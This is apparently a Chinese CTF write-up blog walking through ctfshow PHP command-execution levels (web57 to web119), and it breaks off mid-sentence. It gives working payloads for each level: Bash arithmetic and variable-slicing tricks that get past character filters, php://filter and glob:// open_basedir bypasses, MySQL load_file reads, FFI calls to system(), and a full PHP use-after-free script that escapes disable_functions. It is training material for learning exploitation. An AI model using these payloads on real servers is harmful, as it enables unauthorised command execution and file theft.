highlight_file(__FILE__); 22} 过滤条件增加\n;|[a-z]|[0-9]|`||#|'|\u0026quot;|`|%|\\x09|\\x26|\\x0a|\u0026gt;|\u0026lt;|.|,|?|*|-|=|[/\n这道题把?过滤了，但是我们可以看到\nsystem(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); 这题会将我们传入的get参数进行拼接后再执行\n题目里有个暗示\n//flag in 36.php 也就是说我们要用符号构造出36\n我们可以利用linux的$(())构造出36\n在linux里面$(())=0，$((~ $(()) ))=-1\n其中~符号表示取反，这里0的取反等于－1\n也就是我们先将36个-1加起来再取反得到我们需要的36\npayload:\nc=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 从而得到flag\nweb58 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} payload:\nc=highlight_file(\u0026#34;flag.php\u0026#34;);\rc=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=flag.php //文件包含，得到的回显需要进行base64解码\rc=show_source(\u0026#39;flag.php\u0026#39;); web59 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 解法与上题一致，不再赘述\n（没搞懂两题有什么区别）\nweb60 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 解法依旧与web58一致\n可能我太菜了看不出有什么区别\nweb61 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧web58\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\u0026hellip;\nweb63 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 依旧\u0026hellip;\u0026hellip;\nweb64 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 嘶，怎么还是那样\u0026hellip;\nweb65 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 同上\u0026hellip;\nweb66 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 本来以为还是一样的，没想到\u0026hellip;\n看来我们要想办法查目录了\n我们可以尝试利用php中查询目录的函数\n比如 scandir()\nvar_dump(scandir(\u0026#39;/\u0026#39;)); 接下来就是查flag，可以通过文件包含来查\nflag.txt前面记得加上/\nweb67 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} 这题解法与web66一致\nweb68 这题貌似只是show_source和highlight_file用不了，其他没什么变化\n可以直接用前两题的方法\n也可以直接\nc=include(\u0026#39;/flag.txt\u0026#39;) //赌 web69 这题相比上一题，print_r() 和 var_dump() 也被禁用了\n我们可以通过寻找其他可以打印数组的函数来打印目录\n我们可以通过var_export()来代替，从而打印目录\nc=var_export(scandir(\u0026#34;/\u0026#34;)); 接下读flag即可\nc=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=/flag.txt 其他的解法：\n查文件\n?c=echo implode(\u0026#34;,\u0026#34;,(scandir(\u0026#39;/\u0026#39;))); ?c=echo json_encode(scandir(\u0026#34;/\u0026#34;)); 读文件\n?c=readgzfile(\u0026#39;/flag.txt\u0026#39;); web70 这题把error_reporting()和ini_set()禁用了\n虽然不知道有什么用，不影响我用上一题的方法读flag\nweb71 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// 你们在炫技吗？ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29你要上天吗？ $s = ob_get_contents();：获取输出缓冲区的内容并赋值给变量s。输出缓冲区在 PHP 中用于临时存储要输出到浏览器等的内容，以便在合适的时候进行处理或修改。\nob_end_clean();：清空输出缓冲区并关闭它，这样就清除了原始的、未经处理的输出内容，以便后续进行自定义的输出处理。\necho preg_replace(\u0026quot;/[0-9]|[a-z]/i\u0026quot;,\u0026quot;?\u0026quot;,$s);：这行代码使用正则表达式对获取到的输出内容（存储在s中）进行替换操作。它会将所有的数字和字母（不区分大小写）都替换为?，然后将处理后的内容输出到浏览器等输出端。\n也就是说这道题会对回显进行处理，让我们没法得到回显\n我们可以用exit()/die()提前结束程序，从而不执行后续代码直接进行回显\nc=var_export(scandir(\u0026#34;/\u0026#34;));exit(); c=readgzfile(\u0026#39;/flag.txt\u0026#39;);exit(); web72 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// 你们在炫技吗？ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29你要上天吗？ 这道题一开始还以为和上一题差不多\n先进行目录查询\nc=var_export(scandir(\u0026#34;./\u0026#34;));exit(); 注意⚠️ 这道题只有权限查询的当前目录也就是./\n而无法访问到其他目录的文件，如 / 根目录\n尝试使用 scandir() 函数来扫描根目录，但由于 open_basedir 限制，这个操作被禁止了。 open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。 当前配置只允许访问 /var/www/html/ 目录及其子目录，但不允许访问其他目录。\n原文链接：https://blog.csdn.net/Myon5/article/details/140079942\n我们可以尝试用glob协议绕过open_basedir协议\npayload:（记得删注释）\n1c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// 创建一个DirectoryIterator对象，遍历根目录 2foreach($a as $f)// 遍历每个条目 3{ 4 echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// 输出条目的名称，并添加一个空格 5} 6exit(0); // 终止脚本执行 7?\u0026gt; 或者\npayload：（记得删注释）\n1c=?\u0026gt;\u0026lt;?php $a = opendir(\u0026#34;glob:///*\u0026#34;); // 打开根目录，并将目录句柄赋值给$a 2while (($file = readdir($a)) !== false) { // 循环读取目录中的每个条目 3 echo $file . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // 输出每个条目的名称，并添加HTML换行标签 4}; 5exit(0); // 终止脚本执行 6?\u0026gt; 我们可以发现flag0.php\n利用uaf的脚本进行命令利用uaf的脚本进行命令执行执行：\n尝试执行ls /; cat /flag0.txt命令\n1c=?\u0026gt;\u0026lt;?php 2pwn(\u0026#34;ls /;cat /flag0.txt\u0026#34;); 3 4function pwn($cmd) { 5 global $abc, $helper, $backtrace; 6 class Vuln { 7 public $a; 8 public function __destruct() { 9 global $backtrace; 10 unset($this-\u0026gt;a); 11 $backtrace = (new Exception)-\u0026gt;getTrace(); # ;) 12 if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { # PHP \u0026gt;= 7.4 13 $backtrace = debug_backtrace(); 14 } 15 } 16 } 17 18 class Helper { 19 public $a, $b, $c, $d; 20 } 21 22 function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { 23 $address = 0; 24 for($j = $s-1; $j \u0026gt;= 0; $j--) { 25 $address \u0026lt;\u0026lt;= 8; 26 $address |= ord($str[$p+$j]); 27 } 28 return $address; 29 } 30 31 function ptr2str($ptr, $m = 8) { 32 $out = \u0026#34;\u0026#34;; 33 for ($i=0; $i \u0026lt; $m; $i++) { 34 $out .= sprintf(\u0026#39;%c\u0026#39;,$ptr \u0026amp; 0xff); 35 $ptr \u0026gt;\u0026gt;= 8; 36 } 37 return $out; 38 } 39 40 function write(\u0026amp;$str, $p, $v, $n = 8) { 41 $i = 0; 42 for($i = 0; $i \u0026lt; $n; $i++) { 43 $str[$p + $i] = sprintf(\u0026#39;%c\u0026#39;,$v \u0026amp; 0xff); 44 $v \u0026gt;\u0026gt;= 8; 45 } 46 } 47 48 function leak($addr, $p = 0, $s = 8) { 49 global $abc, $helper; 50 write($abc, 0x68, $addr + $p - 0x10); 51 $leak = strlen($helper-\u0026gt;a); 52 if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } 53 return $leak; 54 } 55 56 function parse_elf($base) { 57 $e_type = leak($base, 0x10, 2); 58 59 $e_phoff = leak($base, 0x20); 60 $e_phentsize = leak($base, 0x36, 2); 61 $e_phnum = leak($base, 0x38, 2); 62 63 for($i = 0; $i \u0026lt; $e_phnum; $i++) { 64 $header = $base + $e_phoff + $i * $e_phentsize; 65 $p_type = leak($header, 0, 4); 66 $p_flags = leak($header, 4, 4); 67 $p_vaddr = leak($header, 0x10); 68 $p_memsz = leak($header, 0x28); 69 70 if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write 71 # handle pie 72 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; 73 $data_size = $p_memsz; 74 } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec 75 $text_size = $p_memsz; 76 } 77 } 78 79 if(!$data_addr || !$text_size || !$data_size) 80 return false; 81 82 return [$data_addr, $text_size, $data_size]; 83 } 84 85 function get_basic_funcs($base, $elf) { 86 list($data_addr, $text_size, $data_size) = $elf; 87 for($i = 0; $i \u0026lt; $data_size / 8; $i++) { 88 $leak = leak($data_addr, $i * 8); 89 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 90 $deref = leak($leak); 91 # \u0026#39;constant\u0026#39; constant check 92 if($deref != 0x746e6174736e6f63) 93 continue; 94 } else continue; 95 96 $leak = leak($data_addr, ($i + 4) * 8); 97 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 98 $deref = leak($leak); 99 # \u0026#39;bin2hex\u0026#39; constant check 100 if($deref != 0x786568326e6962) 101 continue; 102 } else continue; 103 104 return $data_addr + $i * 8; 105 } 106 } 107 108 function get_binary_base($binary_leak) { 109 $base = 0; 110 $start = $binary_leak \u0026amp; 0xfffffffffffff000; 111 for($i = 0; $i \u0026lt; 0x1000; $i++) { 112 $addr = $start - 0x1000 * $i; 113 $leak = leak($addr, 0, 7); 114 if($leak == 0x10102464c457f) { # ELF header 115 return $addr; 116 } 117 } 118 } 119 120 function get_system($basic_funcs) { 121 $addr = $basic_funcs; 122 do { 123 $f_entry = leak($addr); 124 $f_name = leak($f_entry, 0, 6); 125 126 if($f_name == 0x6d6574737973) { # system 127 return leak($addr + 8); 128 } 129 $addr += 0x20; 130 } while($f_entry != 0); 131 return false; 132 } 133 134 function trigger_uaf($arg) { 135 # str_shuffle prevents opcache string interning 136 $arg = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 137 $vuln = new Vuln(); 138 $vuln-\u0026gt;a = $arg; 139 } 140 141 if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { 142 die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); 143 } 144 145 $n_alloc = 10; # increase this value if UAF fails 146 $contiguous = []; 147 for($i = 0; $i \u0026lt; $n_alloc; $i++) 148 $contiguous[] = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 149 150 trigger_uaf(\u0026#39;x\u0026#39;); 151 $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; 152 153 $helper = new Helper; 154 $helper-\u0026gt;b = function ($x) { }; 155 156 if(strlen($abc) == 79 || strlen($abc) == 0) { 157 die(\u0026#34;UAF failed\u0026#34;); 158 } 159 160 # leaks 161 $closure_handlers = str2ptr($abc, 0); 162 $php_heap = str2ptr($abc, 0x58); 163 $abc_addr = $php_heap - 0xc8; 164 165 # fake value 166 write($abc, 0x60, 2); 167 write($abc, 0x70, 6); 168 169 # fake reference 170 write($abc, 0x10, $abc_addr + 0x60); 171 write($abc, 0x18, 0xa); 172 173 $closure_obj = str2ptr($abc, 0x20); 174 175 $binary_leak = leak($closure_handlers, 8); 176 if(!($base = get_binary_base($binary_leak))) { 177 die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); 178 } 179 180 if(!($elf = parse_elf($base))) { 181 die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); 182 } 183 184 if(!($basic_funcs = get_basic_funcs($base, $elf))) { 185 die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); 186 } 187 188 if(!($zif_system = get_system($basic_funcs))) { 189 die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); 190 } 191 192 # fake closure object 193 $fake_obj_offset = 0xd0; 194 for($i = 0; $i \u0026lt; 0x110; $i += 8) { 195 write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); 196 } 197 198 # pwn 199 write($abc, 0x20, $abc_addr + $fake_obj_offset); 200 write($abc, 0xd0 + 0x38, 1, 4); # internal func type 201 write($abc, 0xd0 + 0x68, $zif_system); # internal func handler 202 203 ($helper-\u0026gt;b)($cmd); 204 exit(); 205} 206?\u0026gt; 记得要转url\n所以什么是uaf呢？ （先挖个坑回头补）\nweb73 这一题和上一题的区别其实就是flag的文件改名了，我们用上一题的方法读一下文件\nc=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// 创建一个DirectoryIterator对象，遍历根目录\rforeach($a as $f)// 遍历每个条目\r{\recho($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// 输出条目的名称，并添加一个空格\r}\rexit(0); // 终止脚本执行\r?\u0026gt; 可以看到一个flagc.txt文件\n这题其实已经关闭了open_basedir，所以我们也可以用之前的方法读\nvar_export(scandir(\u0026#39;/\u0026#39;));exit(); echo(implode(\u0026#39; \u0026#39;,scandir(\u0026#39;/\u0026#39;)));exit(); 读文件的话上一题的uaf方法被ban了，这题用不了\n所以我们还是用之前方法\nc=readgzfile(\u0026#39;/flagc.txt\u0026#39;);exit(); web74 这题我先用之前的方法var_export试试能不能读到目录，发现显示null，应该是open_basedir打开了\n接着用glob协议的方法读到了，flag文件名叫做flagx.txt\n先用uaf的方法试试\n发现这条路被ban掉了\n最后用\nc=readgzfile(\u0026#39;/flagx.txt\u0026#39;);exit(); 成功查到了flag\nweb75 这题要用glob查文件，用var_export查不了\n接下来是读文件\n尝试了uaf和readgzfile之类的方法都失败了\n没办法看看大佬怎么做的\n我们其实可以用到mysql的load_file方法，从而读到flag\npayload:\n1c=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); 豆包解释一下\n数据库连接： $conn = mysqli_connect(\u0026quot;127.0.0.1\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;ctftraining\u0026quot;); 这行代码使用 MySQLi 扩展建立了一个与 MySQL 数据库的连接。它指定了数据库服务器的 IP 地址为127.0.0.1（本地主机），用户名是root，密码也是root，要连接的数据库名称是ctftraining。如果连接成功，$conn将保存这个数据库连接对象，以便后续进行数据库操作；如果连接失败，将会产生一个错误信息（不过在这段代码中没有对连接失败情况做显式处理）。 SQL 查询语句构建： $sql = \u0026quot;select load_file('/flag36.txt') as a\u0026quot;; 这里构建了一个 SQL 查询语句。load_file()是 MySQL 中的一个函数，它的作用是读取指定路径的文件内容，并以字符串的形式返回。在这个查询中，它试图读取服务器上/flag36.txt文件的内容，并给查询结果的这一列起了一个别名a。 执行查询并获取结果： $row = mysqli_query($conn, $sql); 这行代码使用已经建立好的数据库连接$conn来执行前面构建的 SQL 查询语句$sql。如果查询执行成功，$row将包含查询结果集的资源对象（可以理解为指向查询结果数据的一种引用）；如果查询失败，同样会产生一个错误信息（这里也未做显式处理）。 while($result=mysqli_fetch_array($row)){ echo $result['a']; } 这个while循环用于遍历查询结果集。mysqli_fetch_array()函数每次从结果集中获取一行数据，并以数组的形式返回。在循环内部，它通过$result['a']来获取前面查询中load_file()函数读取到的文件内容（因为在查询中给这一列起了别名a），并将其输出到屏幕上。 程序结束： exit(); 这行代码使得脚本在完成查询结果输出后立即终止执行，不再执行后续可能存在的其他代码。 也可以\n用PDO的方法来实现同样的目的\npayload:\n1c=try {$dbh = new PDO(\u0026#39;mysql:host=localhost;dbname=ctftraining\u0026#39;, \u0026#39;root\u0026#39;, 2\u0026#39;root\u0026#39;);foreach($dbh-\u0026gt;query(\u0026#39;select load_file(\u0026#34;/flag36.txt\u0026#34;)\u0026#39;) as $row) 3{echo($row[0]).\u0026#34;|\u0026#34;; }$dbh = null;}catch (PDOException $e) {echo $e- 4\u0026gt;getMessage();exit(0);}exit(0); 数据库连接建立： $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); 这行代码使用 PDO 创建了一个与 MySQL 数据库的连接对象 $dbh。它指定了数据库服务器的主机名为 localhost，要连接的数据库名称是 ctftraining，以及用于登录数据库的用户名 root 和密码 root。如果连接成功，后续就可以通过这个对象进行数据库相关的操作；如果连接失败，将会抛出一个 PDOException 异常。 执行查询操作： foreach($dbh-\u0026gt;query('select load_file(\u0026quot;/flag36.txt\u0026quot;)') as $row) 这里通过已建立的数据库连接对象 $dbh 执行了一个 SQL 查询语句 select load_file(\u0026quot;/flag36.txt\u0026quot;)。load_file() 是 MySQL 中的一个函数，用于读取指定路径的文件内容。这个查询语句的目的就是获取服务器上 /flag36.txt 文件的内容。 然后使用 foreach 循环来遍历查询结果集。每次循环，$row 将会获取到查询结果集中的一行数据，由于查询结果只有一列（即 load_file() 函数返回的文件内容那一列），所以可以通过 $row[0] 来获取这一列的值。 结果输出与资源释放 结果输出： echo($row[0]).\u0026quot;|\u0026quot;; 在每次遍历查询结果集的循环中，这行代码将获取到的文件内容（通过 $row[0]）输出到屏幕上，并在后面添加一个 | 作为分隔符。 数据库连接资源释放： $dbh = null; 当查询结果处理完毕后，这行代码将数据库连接对象 $dbh 设置为 null，这有助于释放与该连接相关的资源，确保系统资源的合理利用。 异常处理 捕获异常： catch (PDOException $e) {echo $e-\u0026gt;getMessage();exit(0);} 整个 try 代码块被放置在一个 try-catch 语句中。如果在尝试建立数据库连接或执行查询等操作过程中出现任何 PDOException 异常（比如数据库连接失败、查询语句语法错误等情况），异常将会被这个 catch 块捕获。 一旦捕获到异常，catch 块中的代码将会执行。这里首先通过 $e-\u0026gt;getMessage() 获取到具体的异常消息，并将其输出到屏幕上，然后使用 exit(0) 终止脚本的执行，以防止后续可能出现的错误或未定义行为。 web76 这题依旧是用glob协议查目录，得到文件名为flag36d.txt\n用上一题mysql的方法，成功查到flag\npayload:\nc=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36d.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); web77 用glob协议的方法查出flag文件为flag36x.php，还有一个readflag文件\n接下来要看看怎么查文件\n上两题用到的读flag的方法（mysql）这题用不了，需要想点其他的方法\n官方的wp用 PHP 中的 FFI（Foreign Function Interface）方法来调用 C 语言的 system 函数，并执行一个 Shell 命令。\n什么是FFI? PHP FFI（Foreign Function Interface）是 PHP 7.4 及以上版本引入的一个强大功能。它允许 PHP 代码直接调用 C 语言函数，从而实现了 PHP 与 C 语言的高效交互。这为 PHP 开发者提供了一种利用 C 语言的高性能和底层操作系统功能的方式。\npayload:\n$ffi = FFI::cdef(\u0026#34;int system(const char *command);\u0026#34;);//创建一个system对象\r$a=\u0026#39;/readflag \u0026gt; 1.txt\u0026#39;;//没有回显的\r$ffi-\u0026gt;system($a);//通过$ffi去调用system函数 通过执行目录中的 /readflag 程序并将其输出重定向到文件 1.txt中（因为只是执行的话没有回显）\n执行一下\n看到有回显应该是成功了，访问一下1.txt\n由于当前用户权限不足我们是不能直接读flag36x.php文件中的内容的，只能通过readflag（脚本里面会进行提权）来读\nweb118 原文地址：https://blog.csdn.net/Myon5/article/details/140145005\n输入数字和小写字母，回显 evil input\n查看源码，发现这里会将提交的参数 code 传给 system 函数\n使用 burpsuite 抓包进行单个字符的模糊测试 fuzz：\n发现过滤掉了数字和小写字母以及一些符号，下面框起来的部分是可用的\n结合题目提示：flag 在 flag.php\n那么我们就需要构造出命令去读取 flag.php\n我们先来了解一下 Linux 的内置变量 在 Linux 系统中，有许多内置变量（环境变量）用于配置系统行为和存储系统信息。\n（1）$BASH\n描述：指向当前使用的Bash解释器的路径。 示例：/bin/bash 用途：用于确定正在使用的Bash版本和路径。\n（2） $PATH\n描述：存储一系列路径，这些路径用于查找可执行文件，当你在命令行中输入命令时，系统会在这些路径中查找对应的可执行文件。 示例：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 用途：影响命令的查找和执行，可以添加自定义脚本或程序的路径。\n（3）$HOME\n描述：当前用户的主目录路径。 示例：/home/username 用途：表示当前用户的主目录，通常用于存储用户配置文件和个人数据。\n（4）$PWD\n描述：当前工作目录（Present Working Directory）。 示例：/home/username/projects 用途：表示当前的工作目录路径，常用于脚本和命令中获取或显示当前目录。\n（5）$USER\n描述：当前登录的用户名。 示例：username 用途：表示当前用户的名称，常用于显示或检查用户信息。\n（6）$SHELL\n描述：当前用户的默认shell。 示例：/bin/bash 用途：表示用户登录时使用的默认shell路径。\n（7）$UID\n描述：当前用户的用户ID。 示例：1000（普通用户），0（root用户） 用途：标识当前用户的唯一ID。\n（8）$IFS\n描述：内部字段分隔符（Internal Field Separator），用于分割输入的字段，默认为空格、制表符和换行符。 示例：默认值为 用途：影响脚本中的字段分割，常用于处理输入和解析文本。\n此外还有很多的内置变量：\n接下来我们需要知道 Bash 变量的切片，与 python 的切片类似，目的还是从指定位置开始提取子字符串，用法：${VAR:offset:length}，看例子：\n${PWD:1:2} 提取从第二个字符开始的两个字符，即 ro，在 Bash 中，字符串切片的索引也是从 0 开始的。\n如果只填一个参数，会默认从指定的位置开始提取到字符串的末尾：\n${PWD:3} 简单测一下我们就可以看出波浪号的效果：从结尾开始取\n但是这里数字被过滤了，因此我们使用大写字母绕过：\n可以发现任意的大小写字母与数字 0 等效\n不难想到这里的 $PWD 应该是 /var/www/html（网页服务所在的常见路径）；\n而 $PATH 的结尾应该也是 /bin（这个在前面我们已经测试过了）。\n因此我们可以构造出 nl 命令来读取 flag.php，由于 ? 可用，因此我们可以进行通配，绕过字母的过滤，构造 payload：\n${PATH:~Q}${PWD:~Q} ????.??? 当然题目还给了其他 payload：\n${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.??? 在Bash中，${#var} 的语法用于获取变量 var 的长度（即字符数）。\n这种形式可以应用于任何变量，无论是字符串变量还是环境变量。\n我们知道 ${HOME} 是 /root，因此 ${#HOME} 就是 5。\n以此类推，最终将这些数字应用到切片中去，绕过对数字的过滤，构造出我们想要执行的命令。\nWeb119 先用上一题的payload打了一下，显示evil input\n测了一下上题用的PATH被ban了\n换个方法\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\r相当于/???/??t ????.???\r匹配/bin/cat ????.??? ${#SHLVL}}=1\n${PWD::${#SHLVL}} = 